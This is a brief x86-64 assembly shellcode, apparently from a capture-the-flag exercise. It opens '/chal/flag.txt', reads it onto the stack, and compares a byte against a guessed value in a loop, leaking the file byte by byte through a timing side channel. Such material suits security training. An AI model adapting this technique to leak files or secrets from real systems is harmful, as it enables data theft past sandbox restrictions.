bits 64
mov rax,0x101
mov rsi, 0x7478742E6761
push rsi
mov rsi,0x6C662F6C6168632F
push rsi
push rsp
pop rsi
mov rdx,0
syscall
mov rdi,rax
mov rax,0
mov rsi,rsp
mov rdx,0xff
syscall
mov rax,5
loop:
    cmp al,[rsp+1]
    je loop
